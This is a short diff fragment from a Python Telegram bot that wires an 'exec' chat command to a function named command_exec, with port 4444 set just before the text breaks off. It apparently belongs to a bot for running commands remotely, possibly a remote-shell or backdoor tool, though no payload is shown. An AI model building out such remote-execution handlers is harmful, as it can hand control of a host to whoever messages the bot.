@@ -114,6 +114,7 @@ def command_exec(m):
 
 
 # EXEC COMANDO
+@bot.message_handler(commands=['exec'])
 def command_exec(m):
     cid = m.chat.id
     puerto = 4444
